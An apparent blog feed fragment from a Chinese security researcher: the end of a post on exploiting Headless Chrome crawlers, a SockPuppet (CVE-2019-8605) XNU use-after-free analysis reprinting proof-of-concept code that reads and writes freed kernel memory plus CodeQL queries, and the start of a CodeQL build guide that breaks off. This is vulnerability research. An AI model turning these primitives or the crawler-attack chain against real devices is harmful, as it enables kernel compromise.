 <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>预期行为：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2016.00.39@2x.png" alt="CleanShot 2021-05-26 at 16.00.39@2x"></p><p>看起来不错 : )</p><p>加入恶意的JS之后:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2016.01.20@2x.png" alt="CleanShot 2021-05-26 at 16.01.20@2x"></p><p>这里有个地方不完美，我本来尝试js web worker加载exp，想 爬虫正常工作，爬取到需要的内容，exp在后台跑，但是我发现要么时间不够我跑exp（需要爬虫停留的久一点），要么就exp跑了，但是内容没爬取到。这点我认为应该可以解决，如果有知道的前端大佬可以分享一下~</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>那么是否存在这样一条攻击链，针对爬虫或者一些Headless Chrome的服务：</p><ul><li>恶意构造页面，集成多个Exploit，覆盖大量Chrome版本，打进去就挖矿or种勒索？</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/7Zi44n1rRIcwwOnyt7QVgWLR5LnI7TEiIQ_fB6TInGCS5fFhcz8eGCVHFUNHbDtw_9sukk5r206zbiXjPJfnjoKjo8eh9aiWQQ7sqhNIzBuaZaUkBhq0IfF4Yfxp4rLkhesfMg.jpeg" alt="img"></p><p>最后还是建议<strong>以官方文档为准</strong>，写代码参考文档而不是从网上的技术文章里摘 : )</p><h2 id="Demo-amp-Exp"><a href="#Demo-amp-Exp" class="headerlink" title="Demo &amp; Exp"></a>Demo &amp; Exp</h2><p><a href="https://github.com/o0xmuhe/headless_chrome_demo">https://github.com/o0xmuhe/headless_chrome_demo</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://developers.google.com/web/updates/2017/04/headless-chrome">https://developers.google.com/web/updates/2017/04/headless-chrome</a></p></li><li><p><a href="https://www.anquanke.com/post/id/103350">https://www.anquanke.com/post/id/103350</a> </p></li><li><p><a href="https://xz.aliyun.com/t/2120">https://xz.aliyun.com/t/2120</a></p></li><li><p><a href="https://wangxin1248.github.io/python/2018/09/python3-spider-8.html">https://wangxin1248.github.io/python/2018/09/python3-spider-8.html</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/29207391">https://zhuanlan.zhihu.com/p/29207391</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Chrome M59引入了 Headless Chrome，至此可以在无GUI的环境下使用Chrome，极大的方便了自动化测试工作，也可以用于预览服务，或者网络爬虫。&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/categories/exploit/"/>
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="Chrome" scheme="http://o0xmuhe.me/tags/Chrome/"/>
    
  </entry>
  
  <entry>
    <title>SockPuppet学习记录(一) : 漏洞分析</title>
    <link href="http://o0xmuhe.me/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://o0xmuhe.me/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-02-27T16:01:01.000Z</published>
    <updated>2021-08-01T14:35:13.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><p>  这个漏洞是由pj0的 <code>nedwill</code> 发现的，而且是一个品相极佳的可以用于越狱的漏洞，本文只是对漏洞进行分析，并且思考/尝试使用CodeQL对该类型漏洞覆盖。当然，在看了原作者的<a href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html">文章</a>之后，才发现nedwill是利用Fuzzing的手段发现的这个漏洞，并且在挖掘读/写原语的时候也是借助了Fuzzing的手段，可以说十分的巧妙和高效了。</p><span id="more"></span><ul><li><p>漏洞issue ：<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806&sort=-id&colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary&q=owner:nedwill@google.com&can=1">1806 - project-zero - Project Zero - Monorail</a></p></li><li><p>系统版本：10.14.3</p></li><li><p>xnu代码：</p></li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/xnu.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled.png"></p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><h2 id="raw-poc"><a href="#raw-poc" class="headerlink" title="raw poc"></a>raw poc</h2><p>在测试原始PoC获得的Crash信息如下：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/crash.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%201.png"></p><p>原始PoC使用了<code>raw socket</code>触发，但是美中不足，这个方式必须要root权限才能触发。<br>(定制化<code>sockaddr_in6</code> 需要<code>raw socket</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPPROTO_IP 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN6_ADDR_ANY &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN6_ADDR_LOOPBACK &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa1</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(struct sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65000</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_LOOPBACK,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa2</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(struct sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65001</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_ANY,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = connect(s, (<span class="keyword">const</span> sockaddr*)&amp;sa1, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">    res = setsockopt(s, <span class="number">41</span>, <span class="number">50</span>, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1.5: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    res = connect(s, (<span class="keyword">const</span> sockaddr*)&amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>后续ned经过研究发现可以通过tcp socket方式触发，可以用于read free’d memroy:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">TCP-based reproducer for CVE-2019-8605</span></span><br><span class="line"><span class="comment">This has the benefit of being reachable from the app sandbox on iOS 12.2.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPV6_3542PKTINFO 46</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[<span class="number">1</span>] = &#123;<span class="string">&#x27;\xaa&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> res = setsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    res = disconnectx(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">socklen_t</span> buffer_len = <span class="keyword">sizeof</span>(buffer);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//get sth from ...</span></span><br><span class="line">    res = getsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, &amp;buffer_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res3: %d\n&quot;</span>, res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got %d\n&quot;</span>, buffer[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>经过nedwill的Fuzzing测试，发现了write free’d memory 的PoC：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  setoptshut.m</span></span><br><span class="line"><span class="comment">//  ExploitDev</span></span><br><span class="line"><span class="comment">//  TCP-based reproducer for CVE-2019-8605, using SONPX_SETOPTSHUT to do a</span></span><br><span class="line"><span class="comment">//  write to the freed memory. Tested on iOS 12.2.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by Ned Williamson on 6/17/19.</span></span><br><span class="line"><span class="comment">//  Copyright © 2019 Ned Williamson. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#import <span class="meta-string">&lt;UIKit/UIKit.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;AppDelegate.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPV6_USE_MIN_MTU 42</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Permit setsockopt after disconnecting (and freeing socket options)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">so_np_extensions</span> <span class="title">sonpx</span> =</span> &#123;.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT&#125;;</span><br><span class="line">    <span class="keyword">int</span> res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &amp;sonpx, <span class="keyword">sizeof</span>(sonpx));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">    res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(minmtu));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    res = disconnectx(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res3: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set, write sth...</span></span><br><span class="line">    res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(minmtu));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res4: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @autoreleasepool &#123;</span><br><span class="line">        <span class="keyword">return</span> UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="bug-analysis"><a href="#bug-analysis" class="headerlink" title="bug analysis"></a>bug analysis</h1><p>根据漏洞描述，可以看到漏洞的 root cause如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">in6_pcbdetach</span><span class="params">(struct inpcb *inp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">        inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            m_freem(inp-&gt;in6p_options);</span><br><span class="line">            inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">        &#125;</span><br><span class="line">        ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad</span></span><br><span class="line">        ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">        <span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">        <span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            (<span class="keyword">void</span>) m_free(inp-&gt;inp_options); <span class="comment">// &lt;- good</span></span><br><span class="line">            inp-&gt;inp_options = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>漏洞路径 <code>bsd/netinet6/in6_pcb.c</code> ，协议族 <code>AF_INET6</code> 的处理函数，从函数名字来看是<br>断开连接时候会执行的一些操作（释放一些资源），但是释放之后忘记把指针置NULL，导致同一个套接字重连的时候又使用到了这个指针（悬垂指针）。<br>根据<code>nedwill</code>的描述，连接断开再<code>set/get socketopt</code>的场景可以触发。</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/vuln_code.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%202.png"></p><p>进入函数之前有一个 socket <code>so_flags</code> 的检查，poc中的 <code>setsockopt()</code> 调用应该是为了能过进入漏洞逻辑设计的。</p><p>利用 <code>socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</code> 这个poc，逻辑应该是：</p><ul><li>创建socket连接</li><li>setsockopt，为了后续可以进入漏洞代码分支，同时设置要读的数据</li><li>disconnectx 断开连接，触发 free 逻辑</li><li>getsockopt，读取已经释放的内存</li></ul><p>写的逻辑类似，不过作者是找到了另外特殊的成员来完成写操作： <code>SONPX_SETOPTSHUT</code>  </p><p>这个洞的品相太好了  :-)</p><h1 id="how-to-find-by-QL"><a href="#how-to-find-by-QL" class="headerlink" title="how to find by QL"></a>how to find by QL</h1><h2 id="xnu-database"><a href="#xnu-database" class="headerlink" title="xnu database"></a>xnu database</h2><p>可以从semmle官方网站下载</p><p><a href="https://semmle.com/large-oss-projects">Analyzing large open source projects</a></p><h2 id="about-this-bug"><a href="#about-this-bug" class="headerlink" title="about this bug"></a>about this bug</h2><p>看起来是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">demo</span><span class="params">(p)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  ptr, p2; <span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    m_free(p-&gt;p1); <span class="comment">// vuln!</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(xxx)&#123;</span><br><span class="line">        freem(p2);</span><br><span class="line">        p2 = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放了内存之后，没有对指针做置NULL处理。</p><ul><li>需要在同一个函数里，同一个代码块里。 <strong><del>锁的问题考虑吗？</del></strong></li><li>释放逻辑，正则匹配下， xxxfree, freexxx, releasexxx之类的</li></ul><h2 id="query-1"><a href="#query-1" class="headerlink" title="query 1"></a>query 1</h2><p>根据上面的描述，我们找到free 调用，且free调用下一行是特定的赋值表达式的情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall call, AssignExpr e</span><br><span class="line">where call.getTarget().getName().regexpMatch(<span class="string">&quot;.*free.*?&quot;</span>) <span class="keyword">and</span></span><br><span class="line">    call.getEnclosingBlock() = e.getEnclosingBlock() <span class="keyword">and</span></span><br><span class="line">    e.getRValue().(Literal).getValue() = <span class="string">&quot;0&quot;</span> <span class="keyword">and</span></span><br><span class="line">    call.getLocation().getStartLine() + <span class="number">1</span> =  e.getLocation().getStartLine()</span><br><span class="line">select call, call.getEnclosingFunction().getName(), call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/query1.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%203.png"></p><p>这里有一个问题，我尝试过<code> free调用的参数作为赋值表达式的左值</code> 这条约束，但是加上之后就找不到任何结果了，如果有人知道原因还请指点一下 : )</p><h2 id="query-2"><a href="#query-2" class="headerlink" title="query 2"></a>query 2</h2><p>上面query可以找到 free后是set NULL的代码段，如果想找不满足条件的，可以检测free逻辑下一行是不是 instance of AssignExpr，当然这样比较粗糙，会存在误报。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall call, Expr e</span><br><span class="line">where call.getTarget().getName().regexpMatch(<span class="string">&quot;.*free.*?&quot;</span>) <span class="keyword">and</span></span><br><span class="line">    call.getEnclosingBlock() = e.getEnclosingBlock() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span>(e instanceof AssignExpr ) <span class="keyword">and</span></span><br><span class="line">    call.getLocation().getStartLine() + <span class="number">1</span> =  e.getLocation().getStartLine()</span><br><span class="line">select call, call.getEnclosingFunction().getName(), call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这样写，虽然可以找到目标代码，但是存在误报（优化TODO）：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/query2.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%204.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Basic&quot;&gt;&lt;a href=&quot;#Basic&quot; class=&quot;headerlink&quot; title=&quot;Basic&quot;&gt;&lt;/a&gt;Basic&lt;/h1&gt;&lt;p&gt;  这个漏洞是由pj0的 &lt;code&gt;nedwill&lt;/code&gt; 发现的，而且是一个品相极佳的可以用于越狱的漏洞，本文只是对漏洞进行分析，并且思考/尝试使用CodeQL对该类型漏洞覆盖。当然，在看了原作者的&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html&quot;&gt;文章&lt;/a&gt;之后，才发现nedwill是利用Fuzzing的手段发现的这个漏洞，并且在挖掘读/写原语的时候也是借助了Fuzzing的手段，可以说十分的巧妙和高效了。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="漏洞分析" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
    <category term="XNU" scheme="http://o0xmuhe.me/tags/XNU/"/>
    
    <category term="CodeQL" scheme="http://o0xmuhe.me/tags/CodeQL/"/>
    
    <category term="iOS" scheme="http://o0xmuhe.me/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL + XNU From 0 to 1</title>
    <link href="http://o0xmuhe.me/2021/02/15/CodeQL-XNU-From-0-to-1/"/>
    <id>http://o0xmuhe.me/2021/02/15/CodeQL-XNU-From-0-to-1/</id>
    <published>2021-02-15T09:04:33.000Z</published>
    <updated>2021-07-30T15:58:29.027Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p><strong>本文属于学习过程中的笔记，基本上是把现有的相关资料整合到一起，阅读已有博客/文章并复现，加入一些自己的想法后记录下来的产物。</strong></p><p>build XNU 过程来自某大佬的博客，<code>build xnu with codeql</code>过程来自<code>github</code></p><span id="more"></span><hr><p><strong>UPDATE</strong> </p><p>2021.3.7 更新，我在big sur上build <code>xnu-7195.81.3</code> 也是遇到了python权限的问题，使用virtualenv的方式解决了。</p><hr><ul><li>如果是老版本，建议先搜一下有没有现成的database可以用。</li><li>如果找不到，对于版本跨度比较大的情况，还是虚拟机+老版本Xcode比较稳。</li></ul><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">Building XNU for macOS Big Sur 11.0.1 (Intel)</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/aliyuncs.com/img/codeql_xnu/codeql-xnu_xnu.md">D4rkD0g/boringforever</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://jeremya.com/sw/Makefile.xnudeps &gt; Makefile.xnudeps</span><br><span class="line">make -f Makefile.xnudeps</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">XNU is now ready to 